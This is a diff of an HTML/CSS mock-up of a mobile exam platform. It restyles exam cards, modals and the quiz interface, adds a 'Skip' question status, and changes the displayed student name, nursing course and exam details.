@@ -25,7 +25,7 @@
         }
 
         #dashboard-container { display: block; }
-        #exam-start-page { display: none; height: 100vh; flex-direction: column; }
+        #exam-start-page { display: none; flex-direction: column; overflow: hidden; }
         #exam-interface-container { display: none; height: 100vh; background: #222; padding: 0; overflow: hidden; }
         #uploading-screen-container { display: none; min-height: 100vh; background: #1c1c1e; position: relative; } 
         #post-exam-dashboard { display: none; }
@@ -207,7 +207,6 @@
             border: 1px solid #3a3a3c;
             position: relative;
             overflow: hidden;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
         .exam-card::before {
@@ -223,13 +222,16 @@
         .exam-header {
             display: flex;
             justify-content: space-between;
-            align-items: center; 
-            padding-bottom: 16px; 
+            align-items: flex-start; 
+            padding-bottom: 0px; 
+            margin-bottom: 0px; 
+            cursor: pointer;
+        }
+
+        .exam-card.expanded .exam-header {
+            padding-bottom: 16px;
             border-bottom: 1px solid #3a3a3c; 
             margin-bottom: 18px; 
-            cursor: pointer;
-            user-select: none;
-            transition: margin-bottom 0.3s ease, padding-bottom 0.3s ease, border-color 0.3s ease;
         }
 
         .exam-title {
@@ -240,24 +242,29 @@
             line-height: 1.4;
         }
 
-        .exam-header-right {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
         .exam-date {
             font-size: 13px;
             color: #aeaeb2;
             text-align: right;
             line-height: 1.4;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
-        .arrow-icon {
-            font-size: 12px;
-            color: #aeaeb2;
-            transition: transform 0.3s ease;
-            transform: rotate(180deg);
+        .arrow-toggle {
+            font-size: 14px;
+            color: #7c7c80;
+            cursor: pointer;
+            user-select: none;
+            transition: transform 0.2s;
+            padding: 4px;
+        }
+
+        .exam-details.collapsed, 
+        .view-score.collapsed,
+        .btn-attempt-custom.collapsed { 
+            display: none !important; 
         }
 
         .exam-details {
@@ -266,10 +273,6 @@
             row-gap: 16px;
             font-size: 14px;
             color: #aeaeb2; 
-            opacity: 1;
-            max-height: 500px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            overflow: hidden;
         }
 
         .exam-details .value {
@@ -298,35 +301,27 @@
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            opacity: 1;
-            max-height: 60px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            overflow: hidden;
         }
 
         .view-score:active {
             background: rgba(42, 101, 191, 0.05); 
         }
 
-        .exam-card.collapsed {
-            padding: 16px 20px;
+        .btn-attempt-custom {
+            margin-top: 22px;
+            width: 100%;
+            padding: 13px; 
+            background: #2a65bf; 
+            border: none; 
+            border-radius: 10px;
+            color: #ffffff; 
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
         }
-        .exam-card.collapsed .exam-header {
-            border-color: transparent;
-            margin-bottom: 0;
-            padding-bottom: 0;
-        }
-        .exam-card.collapsed .arrow-icon {
-            transform: rotate(0deg);
-        }
-        .exam-card.collapsed .exam-details,
-        .exam-card.collapsed .view-score {
-            opacity: 0;
-            max-height: 0;
-            margin-top: 0;
-            padding-top: 0;
-            padding-bottom: 0;
-            pointer-events: none;
+
+        .btn-attempt-custom:active {
+            background: #1e4b8f; 
         }
 
         .hidden { display: none !important; }
@@ -357,39 +352,111 @@
             top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.65);
             display: flex; justify-content: center; align-items: center;
-            z-index: 2000; padding: 24px; 
+            z-index: 5000; padding: 24px; 
         }
 
         .modal-box {
             background: #2a2a2e; 
             border: 1px solid #3a3a3f;
-            border-radius: 12px; 
-            width: 100%; max-width: 320px;
-            padding: 38px 16px 16px;
+            border-radius: 4px; 
+            width: 100%; max-width: 400px;
+            padding: 0;
             text-align: center; position: relative;
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            overflow: hidden;
         }
 
-        .modal-icon {
-            position: absolute; top: -28px; left: 50%; transform: translateX(-50%);
-            width: 56px; height: 56px; background: #2a65bf; 
-            border-radius: 50%; border: 3px solid #2a2a2e; outline: 2px solid #ffffff; 
+        .modal-header-custom {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #2a65bf;
+            padding: 10px 15px;
+            color: white;
+            font-weight: bold;
+            font-size: 15px;
+        }
+
+        .modal-close-custom {
+            background: #ef4444;
+            color: white;
+            border: none;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 2px;
+        }
+
+        .modal-body-custom {
+            padding: 20px;
+            background-color: #2c2c2e;
+        }
+
+        .modal-input-custom {
+            width: 100%;
+            padding: 12px;
+            background: #1c1c1e;
+            border: 1px solid #48484a;
+            border-radius: 4px;
+            color: white;
+            font-size: 15px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+
+        .modal-input-custom::placeholder {
+            color: #8e8e93;
+        }
+
+        .modal-verify-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #22c55e;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .modal-icon { display: none; }
+        .modal-title { display: none; }
+        .modal-text { display: none; }
+        .modal-input-group { display: none; }
+        .modal-btn-container { display: none; }
+
+        /* ===== Notification Modal (New Style - IMG_2794.PNG) ===== */
+        .notif-box {
+            background: #2a2a2e; 
+            border: 1px solid #3a3a3f;
+            border-radius: 8px; 
+            width: 100%; max-width: 340px;
+            padding: 48px 20px 20px;
+            text-align: center; position: relative;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.6);
+        }
+
+        .notif-badge {
+            position: absolute; top: -32px; left: 50%; transform: translateX(-50%);
+            width: 64px; height: 64px; background: #2a65bf; 
+            border-radius: 50%; border: 3px solid #ffffff; outline: 1.5px solid #2a2a2e;
             display: flex; justify-content: center; align-items: center;
-            font-size: 26px; font-weight: bold; color: white;
+            font-size: 30px; font-weight: bold; color: white;
+            z-index: 10;
         }
 
-        .modal-title { font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 14px; }
-        .modal-text { font-size: 13.5px; color: #e0e0e3; line-height: 1.6; margin-bottom: 20px; text-align: center; }
-        .modal-input-group { margin-bottom: 20px; text-align: left; }
-        .modal-input-group label { display: block; color: #aeaeb2; font-size: 13px; margin-bottom: 8px; }
-        .modal-input-group input {
-            width: 100%; padding: 12px; background: #1c1c1e; border: 1px solid #3a3a3c;
-            border-radius: 8px; color: white; font-size: 16px; outline: none;
+        .notif-title { font-size: 19px; font-weight: bold; color: #ffffff; margin-bottom: 18px; }
+        .notif-text { font-size: 16px; color: #ffffff; line-height: 1.6; margin-bottom: 25px; font-weight: 500; }
+        .notif-ok-btn { 
+            width: 100%; padding: 13px; background: #2a65bf; color: white; 
+            border: none; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; 
         }
-
-        .modal-btn-container { display: flex; gap: 10px; }
-        .modal-btn { width: 100%; padding: 11px; background: #2a65bf; color: white; border: none; border-radius: 6px; font-size: 15px; cursor: pointer; font-weight: 500; }
-        .modal-btn.btn-secondary { background: #3a3a3c; color: #ffffff; }
 
         /* ===== Bottom Sheets ===== */
         .bottom-sheet-overlay {
@@ -416,7 +483,6 @@
         .filter-option.selected .filter-radio { border-color: #2a65bf; }
         .filter-radio::after { content: ""; width: 10px; height: 10px; background: transparent; border-radius: 50%; }
         .filter-option.selected .filter-radio::after { background: #2a65bf; }
-        .filter-option.selected .filter-label { color: #2a65bf; }
         .filter-label { font-size: 15px; color: #ffffff; }
         .filter-show-btn { width: 100%; background: #2a65bf; color: #ffffff; border: none; border-radius: 10px; padding: 12px; font-weight: 600; margin-top: 16px; cursor: pointer; }
 
@@ -432,17 +498,50 @@
         /* ===== Instructions Page ===== */
         .page-header { padding: 15px; display: flex; align-items: center; background-color: #2c2c2e; border-bottom: 1px solid #3a3a3c; }
         .back-arrow { font-size: 24px; margin-right: 15px; cursor: pointer; color: #ffffff; }
-        .detail-list { padding: 20px; flex-grow: 1; }
-        .detail-item { display: flex; flex-direction: column; margin-bottom: 20px; }
-        .detail-item .dt-label { color: #aeaeb2; font-size: 13px; margin-bottom: 5px; }
-        .detail-item .dt-value { font-size: 16px; color: #ffffff; font-weight: 500; }
-        .instructions-box { background-color: #2c2c2e; padding: 20px; border-radius: 8px; border: 1px solid #3a3a3c; height: 150px; color: #aeaeb2; font-size: 14px; margin-top: 8px; }
-        .footer-action { padding: 20px; background-color: #1c1c1e; }
+        .detail-list { padding: 20px; overflow-y: auto; }
+        
+        .detail-item { 
+            display: flex; 
+            align-items: center; 
+            gap: 16px; 
+            margin-bottom: 20px; 
+            padding-bottom: 15px; 
+            border-bottom: 1px solid #2d2d30; 
+        }
+        
+        .detail-item:last-of-type { border-bottom: none; }
+
+        .detail-icon-box {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .detail-icon-box svg {
+            width: 20px;
+            height: 20px;
+            stroke: #aeaeb2;
+            fill: none;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .detail-info-box { display: flex; flex-direction: column; gap: 4px; }
+        .detail-info-box .dt-label { color: #aeaeb2; font-size: 13px; font-weight: 500; }
+        .detail-info-box .dt-value { font-size: 15px; color: #ffffff; font-weight: bold; }
+
+        .instructions-box { background-color: #2c2c2e; padding: 20px; border-radius: 8px; border: 1px solid #3a3a3c; height: 120px; color: #aeaeb2; font-size: 14px; margin-top: 12px; }
+        .footer-action { padding: 20px; background-color: #1c1c1e; position: absolute; bottom: 0; width: 100%; }
 
         @media (min-width: 1024px) { .content { max-width: 900px; } }
 
+
         /* =========================================================
-           2. هيكل الاختبار والاعدادات المحفوظة
+           2. التنسيق المحفوظ لمنع تمدد الشاشة وضبط هيكل الاختبار
            ========================================================= */
         :root {
             --bg: #1a1b1e;
@@ -495,6 +594,9 @@
             padding: 6px 14px;
             flex-shrink: 0;
             width: 100%;
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
 
         .timer {
@@ -503,6 +605,27 @@
             font-weight: 600;
             letter-spacing: 0.5px;
             text-align: left;
+        }
+
+        .timer-icon-btn {
+            width: 34px;
+            height: 34px;
+            background: #0d1624;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: default;
+        }
+
+        .timer-icon-svg {
+            width: 20px;
+            height: 20px;
+            stroke: #ffffff;
+            stroke-width: 2.2;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
         }
 
         .header {
@@ -575,22 +698,23 @@
         .progress-bar { width: 0%; height: 100%; background: #22c55e; border-radius: 3px; transition: width 0.4s ease; }
         .progress-pct { font-size: 12px; color: var(--text-muted); min-width: 35px; text-align: right; }
 
-        .section-badge {
-            display: inline-flex;
-            flex-direction: column; 
-            align-items: stretch;
-            background: #41444d; 
-            border: 1.5px solid #3b82f6;
-            border-radius: 5px;
-            padding: 8px 12px;
-            margin-top: 6px;
-            min-width: 140px;
-            gap: 6px; 
-        }
+.section-badge {
+    display: inline-flex;
+    flex-direction: column; /* لترتيب النصوص في الأعلى والشريط في الأسفل */
+    align-items: stretch;
+    background: #41444d; 
+    border: 1.5px solid #3b82f6;
+    border-radius: 5px;
+    padding: 8px 12px;
+    margin-top: 6px;
+    min-width: 140px;
+    gap: 6px; /* مسافة فاصلة بين السطر العلوي وشريط التقدم */
+}
 
         .section-title { font-size: 12.5px; font-weight: 600; color: var(--text-primary); }
         .section-pct { font-size: 12.5px; color: var(--text-primary); font-weight: 600; margin-left: 8px; }
 
+        /* [تحديث استراتيجي تلبية لطلبك] تعديل خصائص وتفاصيل خطوط الـ default section عند تشغيل وضع النهار المضيء */
         [data-theme="light"] .section-badge {
             background: #ffffff !important;
         }
@@ -647,25 +771,34 @@
         .sidebar-q-btn.answered { background: #22c55e !important; color: #fff; }
         .sidebar-q-btn.unanswered { background: #3b82f6; }
         .sidebar-q-btn.flagged { background: #f59e0b !important; color: #fff !important; }
+        .sidebar-q-btn.skipped { background: #ef4444 !important; color: #fff !important; }
 
         .sidebar-arrow-indicator {
-            content: '';
-            position: absolute;
-            right: 0px;
-            top: 0;
-            width: 0;
-            height: 0;
-            border-top: 16px solid transparent;
-            border-bottom: 16px solid transparent;
-            border-left: 8px solid #3b82f6;
-            z-index: 10;
-            display: none;
-        }
+    content: '';
+    position: absolute;
+    right: 0px;
+    top: 0;
+    width: 0;
+    height: 0;
+    border-top: 16px solid transparent;
+    border-bottom: 16px solid transparent;
+    border-left: 8px solid #3b82f6;
+    z-index: 10;
+    display: none;
+}
 
-        .sidebar-q-container.active-q .sidebar-arrow-indicator { display: block; }
-        .sidebar-q-container.active-q .sidebar-q-btn.flagged + .sidebar-arrow-indicator { border-left-color: #f59e0b !important; }
-        .sidebar-q-container.active-q .sidebar-q-btn.answered + .sidebar-arrow-indicator { border-left-color: #22c55e !important; }
-         
+.sidebar-q-container.active-q .sidebar-arrow-indicator { display: block; }
+
+/* سهم السؤال الحالي إذا كان عليه علم (برتقالي) */
+.sidebar-q-container.active-q .sidebar-q-btn.flagged + .sidebar-arrow-indicator { border-left-color: #f59e0b !important; }
+
+/* سهم السؤال الحالي إذا تم حلّه (أخضر) - السطر الجديد */
+.sidebar-q-container.active-q .sidebar-q-btn.answered + .sidebar-arrow-indicator { border-left-color: #22c55e !important; }
+
+/* سهم السؤال الحالي إذا تم تخطيه (أحمر) */
+.sidebar-q-container.active-q .sidebar-q-btn.skipped + .sidebar-arrow-indicator { border-left-color: #ef4444 !important; }
+        
+
         .question-area {
             flex: 1;
             display: flex;
@@ -757,12 +890,12 @@
             border-top: 1px solid var(--footer-border);
         }
 
-        .btn-footer { border-radius: 6px; padding: 8px 24px; font-weight: 600; font-size: 13px; cursor: pointer; text-align: center; white-space: nowrap; }
+        .btn-footer { border-radius: 6px; padding: 8px 24px; font-weight: 600; font-size: 13px; cursor: pointer; text-align: center; white-space: nowrap; color: #ffffff !important; }
 
-        .btn-prev { background: transparent; border: 1.5px solid #2d3139; color: #4b5261; }
-        .btn-prev.active-btn { border-color: var(--text-primary); color: var(--text-primary); }
-        .btn-flag { background: transparent; border: 1.5px solid var(--text-primary); color: var(--text-primary); }
-        .btn-next { background: #3b82f6; border: none; color: #fff; padding: 8px 32px; }
+        .btn-prev { background: transparent; border: 1.5px solid #2d3139; }
+        .btn-prev.active-btn { border-color: #ffffff; }
+        .btn-flag { background: transparent; border: 1.5px solid #ffffff; }
+        .btn-next { background: #3b82f6; border: none; padding: 8px 32px; }
 
         /* =========================================
            4. شاشة ملخص الإجابات المحفوظة (Summary Sheet Modal)
@@ -794,6 +927,7 @@
         .box-not-attempted { background: #3b82f6; }
         .box-attempted { background: #22c55e; }
         .box-flagged { background: #f59e0b; }
+        .box-skipped { background: #ef4444; }
 
         .summary-divider { height: 1px; background: var(--option-border); margin: 10px 0 20px; }
         .items-title-red { color: #ef4444; font-size: 15px; font-weight: 700; margin-bottom: 14px; }
@@ -804,12 +938,14 @@
         .summary-item-block.status-answered { background: #82cc6c; } 
         .summary-item-block.status-not-attempted { background: #3b82f6; }
         .summary-item-block.status-flagged { background: #f59e0b; }
+        .summary-item-block.status-skipped { background: #ef4444; }
 
         .summary-footer { margin-top: auto; display: flex; justify-content: center; padding: 20px 0 14px; flex-shrink: 0; }
         .btn-summary-end { background: #ef4444; border: none; color: #ffffff; padding: 12px 0; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; width: 45%; text-align: center; box-shadow: 0 4px 10px rgba(239, 68, 68, 0.25); }
 
+
         /* =========================================
-           5. ستايل صفحة الرفع السحابي والمودالز
+           5. ستايل صفحة الرفع السحابي والمودالز المتبقية
            ========================================= */
         .upload-screen { display: flex; flex-direction: column; justify-content: space-between; height: 100vh; padding: 40px 24px; background-color: #1c1c1e; box-sizing: border-box; }
         .upload-header-layout { display: flex; align-items: center; gap: 16px; margin-bottom: 20px; }
@@ -865,7 +1001,7 @@
             </div>
             <div class="user-text">
                 <span>Welcome</span>
-                <span>MOHAMMED HUSSAIN MOHAMMED HAKMI</span>
+                <span>yousef abdulrhman saud alhodaib</span>
             </div>
         </div>
 
@@ -899,29 +1035,31 @@
     <div id="dashboard-page" class="content">
         <div class="header-row">
             <div>Total Exams: <span id="exams-count">1</span></div>
-            <div class="toggle active" id="toggle-container" onclick="toggleSwitch()">
+            <div class="toggle" id="toggle-container" onclick="toggleSwitch()">
                 <span id="toggle-text">Close All</span>
                 <div class="toggle-switch"></div>
             </div>
         </div>
 
         <div id="exams-container">
-            <div class="exam-card" id="main-exam-card">
-                <div class="exam-header" onclick="toggleCardAccordion(event)">
-                    <div class="exam-title">الاختبار النهائي</div>
-                    <div class="exam-header-right">
-                        <div class="exam-date">07 Jun 2026<br>01:00 PM</div>
-                        <div class="arrow-icon">▼</div>
+            <div class="exam-card" onclick="toggleExamCard(this)">
+                <div class="exam-header">
+                    <div class="exam-title">Final Exam312,2026</div>
+                    <div class="exam-date">
+                        <div>
+                            <span style="color: #ffffff;">09 Jun 2026</span><br>01:00 PM
+                        </div>
+                        <span class="arrow-toggle">▼</span>
                     </div>
                 </div>
-                <div class="exam-details">
-                    <span>Course</span> <span class="value">Maternal Health Nursing</span>
-                    <span>Duration</span> <span class="value">03:30:00</span>
+                <div class="exam-details collapsed">
+                    <span>Course</span> <span class="value">Infection Control for Nursing</span>
+                    <span>Duration</span> <span class="value">02:00:00</span>
                     <span>Proctored</span> <span class="value">No</span>
                     <span>Status</span> <span class="value status-Available">Available</span>
                     <span>Upload Status</span> <span class="value">-</span>
                 </div>
-                <button class="view-score" onclick="goToExamPage()">Attempt (Take Exam)</button>
+                <button class="btn-attempt-custom collapsed" onclick="event.stopPropagation(); goToExamPage()">Attempt (Take Exam)</button>
             </div>
         </div>
         
@@ -933,14 +1071,59 @@
     <div id="exam-start-page">
         <div class="page-header">
             <span class="back-arrow" onclick="goBackToDashboard()">&#8592;</span>
-            <span style="font-weight: bold; color: white;">الاختبار النهائي</span>
+            <span style="font-weight: bold; color: white;">Final Exam312,2026</span>
         </div>
         <div class="detail-list">
-            <div class="detail-item"><span>Course</span><span class="dt-value">Maternal Health Nursing</span></div>
-            <div class="detail-item"><span>Total Duration</span><span class="dt-value">03:30:00</span></div>
-            <div class="detail-item"><span>Remaining Duration</span><span class="dt-value" id="timer-display" style="color: #2a65bf;">03:30:00</span></div>
-            <div class="detail-item"><span>Language</span><span class="dt-value">English</span></div>
-            <div class="detail-item"><span>Proctored</span><span class="dt-value">No</span></div>
+            <div class="detail-item">
+                <div class="detail-icon-box">
+                    <svg viewBox="0 0 24 24"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path></svg>
+                </div>
+                <div class="detail-info-box">
+                    <span class="dt-label">Course</span>
+                    <span class="dt-value">Infection Control for Nursing</span>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="detail-icon-box">
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                </div>
+                <div class="detail-info-box">
+                    <span class="dt-label">Total Duration</span>
+                    <span class="dt-value">02:00:00</span>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="detail-icon-box">
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="13" r="8"></circle><path d="M12 9v4l2 2"></path><path d="M5 3 2 6"></path><path d="M22 6 19 3"></path></svg>
+                </div>
+                <div class="detail-info-box">
+                    <span class="dt-label">Remaining Duration</span>
+                    <span class="dt-value" id="timer-display" style="color: #2a65bf;">02:00:00</span>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="detail-icon-box">
+                    <svg viewBox="0 0 24 24"><path d="m5 8 6 6"></path><path d="m4 14 6-6 2-3"></path><path d="M2 5h12"></path><path d="M7 2h1"></path><path d="m22 22-5-10-5 10"></path><path d="M14 18h6"></path></svg>
+                </div>
+                <div class="detail-info-box">
+                    <span class="dt-label">Language</span>
+                    <span class="dt-value">English</span>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="detail-icon-box">
+                    <svg viewBox="0 0 24 24"><path d="M8 3H5a2 2 0 0 0-2 2v3"></path><path d="M21 8V5a2 2 0 0 0-2-2h-3"></path><path d="M3 16v3a2 2 0 0 0 2 2h3"></path><path d="M16 21h3a2 2 0 0 0 2-2v-3"></path><path d="M7 14s1-1 5-1 5 1 5 1"></path><circle cx="12" cy="9" r="3"></circle></svg>
+                </div>
+                <div class="detail-info-box">
+                    <span class="dt-label">Proctored</span>
+                    <span class="dt-value">No</span>
+                </div>
+            </div>
+
             <div style="margin-top: 20px;">
                 <span style="font-weight: bold; font-size: 14px; color: white;">Instructions</span>
                 <div class="instructions-box">No Instructions Available.</div>
@@ -953,9 +1136,13 @@
 </div>
 
 
+<!-- =========================================================
+     واجهة الاختبار المحدثة كلياً والمحصنة من مشاكل التمدد
+     ========================================================= -->
 <div id="exam-interface-container">
     <div class="quiz-container" id="quizApp">
         
+        <!-- شاشة ملخص الإجابات مدمجة بطبقة علوية مطلقة داخل نفس الأبعاد لمنع سقوط العناصر -->
         <div class="summary-modal" id="summaryScreen">
             <div class="summary-header">
                 <h3>Answer Sheet Summary</h3>
@@ -981,6 +1168,10 @@
                         <span>Flagged</span>
                         <div class="filter-color-box box-flagged"></div>
                     </div>
+                    <div class="filter-item">
+                        <span>Skipped</span>
+                        <div class="filter-color-box box-skipped"></div>
+                    </div>
                 </div>
 
                 <div class="summary-divider"></div>
@@ -995,14 +1186,21 @@
         </div>
 
         <div class="timer-bar">
-            <div class="timer" id="countdownTimerText">03:30:00</div>
+            <div class="timer" id="countdownTimerText">02:00:00</div>
+            <div class="timer-icon-btn">
+                <svg class="timer-icon-svg" viewBox="0 0 24 24">
+                    <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"></path>
+                    <path d="M3 3v5h5"></path>
+                    <path d="M12 7v5l4 2"></path>
+                </svg>
+            </div>
         </div>
         
         <div class="header">
             <div class="student-row">
                 <div>
                     <div class="student-name-label">Student Name</div>
-                    <div class="student-name">MOHAMMED HUSSAIN HAKMI</div>
+                    <div class="student-name">yousef abdulrhman saud alhodaib</div>
                 </div>
                 <div class="header-buttons">
                     <div id="hiddenSecretPasswordDisplay"></div>
@@ -1020,22 +1218,22 @@
                     <span class="progress-pct" id="itemsPercentLabel">0%</span>
                 </div>
                 <div class="progress-row">
-                    <span class="progress-label" id="timeMinutesLabel">Time 0 / 210 (mins)</span>
+                    <span class="progress-label" id="timeMinutesLabel">Time 0 / 120 (mins)</span>
                     <div class="progress-track">
                         <div class="progress-bar" id="timeProgressBarFill"></div>
                     </div>
                     <span class="progress-pct" id="timePercentLabel">0%</span>
                 </div>
-                <div class="section-badge">
-                    <div style="display: flex; justify-content: space-between; align-items: center; gap: 12px; width: 100%;">
-                        <span class="section-title">Default Section</span>
-                        <span class="section-pct" id="modePercentLabel">0%</span>
-                    </div>
-                    
-                    <div class="progress-track" style="height: 5px; background: rgba(0, 0, 0, 0.4); border-radius: 3px; overflow: hidden; width: 100%; margin-top: 2px; flex: none;">
-                        <div class="progress-bar" id="modeProgressBarFill" style="width: 0%; height: 100%; background: #22c55e; transition: width 0.4s ease; border-radius: 3px;"></div>
-                    </div>
-                </div>
+<div class="section-badge">
+    <div style="display: flex; justify-content: space-between; align-items: center; gap: 12px; width: 100%;">
+        <span class="section-title">Default Section</span>
+        <span class="section-pct" id="modePercentLabel">0%</span>
+    </div>
+    
+<div class="progress-track" style="height: 5px; background: rgba(0, 0, 0, 0.4); border-radius: 3px; overflow: hidden; width: 100%; margin-top: 2px; flex: none;">
+    <div class="progress-bar" id="modeProgressBarFill" style="width: 0%; height: 100%; background: #22c55e; transition: width 0.4s ease; border-radius: 3px;"></div>
+</div>
+</div>
             </div>
         </div>
 
@@ -1047,7 +1245,7 @@
                     <div class="meta-info">
                         <span id="currentQuestionIdLabel">Q.1</span>
                         <span id="currentQuestionTypeLabel">Multi Choice</span>
-                        <span id="currentQuestionMarksLabel">Marks: 0.50</span>
+                        <span id="currentQuestionMarksLabel">Marks: 0.60</span>
                     </div>
                     <div class="meta-divider"></div>
                     <div class="controls-row">
@@ -1079,6 +1277,7 @@
         <div class="footer">
             <button type="button" class="btn-footer btn-prev" id="examPrevBtn">Previous</button>
             <button type="button" class="btn-footer btn-flag" id="examFlagBtn">Flag</button>
+            <button type="button" class="btn-footer btn-flag" id="examSkipBtn" style="margin-left: 10px;">Skip</button>
             <button type="button" class="btn-footer btn-next" id="examNextBtn">Next</button>
         </div>
     </div>
@@ -1133,7 +1332,7 @@
             </div>
             <div class="user-text">
                 <span>Welcome</span>
-                <span>MOHAMMED HUSSAIN MOHAMMED HAKMI</span>
+                <span>yousef abdulrhman saud alhodaib</span>
             </div>
         </div>
         <div class="icons">
@@ -1142,6 +1341,18 @@
             </svg>
             <svg class="icon-svg" viewBox="0 0 24 24">
                 <circle cx="11" cy="11" r="8"></circle>
+                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+            </svg>
+            <svg class="icon-svg" viewBox="0 0 24 24" style="fill: none; stroke: #ffffff; stroke-width: 2.5;" onclick="openFilter()">
+                <line x1="2" y1="8" x2="22" y2="8"></line>
+                <circle cx="9" cy="8" r="2.5" style="fill: #ffffff; stroke: none;"></circle>
+                <line x1="2" y1="16" x2="22" y2="16"></line>
+                <circle cx="15" cy="16" r="2.5" style="fill: #ffffff; stroke: none;"></circle>
+            </svg>
+            <svg class="icon-svg" viewBox="0 0 24 24" onclick="openNotificationModal()">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="12" y1="16" x2="12" y2="12"></line>
+                <line x1="12" y1="8" x2="12.01" y2="8"></line>
             </svg>
         </div>
     </div>
@@ -1154,29 +1365,31 @@
     <div class="content">
         <div class="header-row">
             <div>Total Exams: <span id="post-exams-count">1</span></div>
-            <div class="toggle active" id="post-toggle-container" onclick="togglePostSwitch()">
-                <span id="post-toggle-text">Close All</span>
+            <div class="toggle" id="post-toggle-container" onclick="togglePostSwitch()">
+                <span id="post-toggle-text">Open All</span>
                 <div class="toggle-switch"></div>
             </div>
         </div>
 
         <div id="post-exams-container">
-            <div class="exam-card" id="post-exam-card">
-                <div class="exam-header" onclick="togglePostCardAccordion(event)">
-                    <div class="exam-title">الاختبار النهائي</div>
-                    <div class="exam-header-right">
-                        <div class="exam-date">07 Jun 2026<br>01:00 PM</div>
-                        <div class="arrow-icon">▼</div>
+            <div class="exam-card" onclick="toggleExamCard(this)">
+                <div class="exam-header">
+                    <div class="exam-title">Final Exam312,2026</div>
+                    <div class="exam-date">
+                        <div>
+                            <span style="color: #ffffff;">09 Jun 2026</span><br>01:00 PM
+                        </div>
+                        <span class="arrow-toggle">▼</span>
                     </div>
                 </div>
-                <div class="exam-details">
-                    <span>Course</span> <span class="value">Maternal Health Nursing</span>
-                    <span>Duration</span> <span class="value">03:30:00</span>
+                <div class="exam-details collapsed">
+                    <span>Course</span> <span class="value">Infection Control for Nursing</span>
+                    <span>Duration</span> <span class="value">02:00:00</span>
                     <span>Proctored</span> <span class="value">No</span>
                     <span>Status</span> <span class="value status-ended">Exam Ended</span>
                     <span>Upload Status</span> <span class="value">Uploaded</span>
                 </div>
-                <button class="view-score" onclick="openResultsNotificationModal()">View Score</button>
+                <button class="view-score collapsed" onclick="event.stopPropagation(); openResultsNotificationModal()">View Score</button>
             </div>
         </div>
         
@@ -1186,19 +1399,36 @@
     </div>
 </div>
 
+<div id="confirm-modal-overlay" class="modal-overlay hidden">
+    <div class="notif-box">
+        <div class="notif-badge">i</div>
+        <div class="notif-title">Notification</div>
+        <div class="notif-text">Are you sure you want to finish exam?</div>
+        <div class="confirm-btn-container">
+            <button class="notif-ok-btn" style="margin-bottom: 12px;" onclick="proceedToUpload()">Yes</button>
+            <button class="notif-ok-btn" onclick="closeConfirmModal()">No</button>
+        </div>
+    </div>
+</div>
+
+<div id="notif-modal-overlay" class="modal-overlay hidden">
+    <div class="notif-box">
+        <div class="notif-badge">i</div>
+        <div class="notif-title" id="notif-custom-title">Notification</div>
+        <div class="notif-text" id="notif-custom-text">Exam Result is not published. Once your result is published, you will receive a notification.</div>
+        <button class="notif-ok-btn" onclick="closeNotifModal()">Ok</button>
+    </div>
+</div>
+
 <div id="score-modal" class="modal-overlay hidden">
     <div class="modal-box">
-        <div class="modal-icon" id="modal-badge-icon">i</div>
-        <div class="modal-title" id="modal-title-text">Notification</div>
-        <div class="modal-text" id="modal-body-text">Exam Result is not published. Once your result is published, you will receive a notification.</div>
-        
-        <div id="modal-password-group" class="modal-input-group hidden">
-            <label>Examination Password</label>
-            <input type="password" id="exam-password-input" placeholder="********">
+        <div class="modal-header-custom">
+            <span id="modal-custom-title">Verification</span>
+            <button class="modal-close-custom" onclick="closeModal()">X</button>
         </div>
-        
-        <div class="modal-btn-container" id="modal-buttons-container">
-            <button class="modal-btn" onclick="closeModal()">Ok</button>
+        <div class="modal-body-custom" id="modal-custom-body">
+            <input type="password" id="exam-password-input" class="modal-input-custom" placeholder="Examination Password">
+            <button class="modal-verify-btn" id="modal-custom-btn" onclick="verifyAndStart()">Verify</button>
         </div>
     </div>
 </div>
@@ -1229,7 +1459,7 @@
                 </div>
                 <div class="profile-info-text">
                     <span class="welcome-lbl">Welcome</span>
-                    <span class="name-lbl">MOHAMMED HUSSAIN MOHAMMED HAKMI</span>
